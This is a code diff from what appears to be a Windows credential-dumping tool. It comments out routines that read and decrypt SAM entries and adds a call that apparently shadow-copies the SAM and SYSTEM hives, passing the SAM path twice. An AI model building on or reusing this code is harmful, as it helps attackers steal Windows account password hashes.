@@ -15,6 +15,7 @@
 
 #include "include/main.h"
 #include "include/proxyNtCalls.h"
+#include "include/shadowMethod.h"
 
 #include "include/cryptopp/aes.h"
 using CryptoPP::AES;
@@ -647,15 +648,20 @@ int main(int argc, char** argv) {
 	#endif // !PROXY_NT_CALLS
 
 	// Time to debug as always works at first :D
-	ULONG size;
-	getSAM(NULL, &size);
+	// 
+	//ULONG size;
+	//getSAM(NULL, &size);
 
 	// Array of PSAM
-	PSAM sam[MAX_SAM_ENTRIES] = {};
+	//PSAM sam[MAX_SAM_ENTRIES] = {};
 
-	getSAM(sam, &size);
+	//getSAM(sam, &size);
 
-	decryptSAM(sam, size/sizeof(SAM));
+	//decryptSAM(sam, size/sizeof(SAM));
 
-	HeapFree(GetProcessHeap(), 0, sam);
+	//HeapFree(GetProcessHeap(), 0, sam);
+
+	WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)];
+	WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)];
+	createSS(sourcePathFileSAM, sourcePathFileSAM);
 }
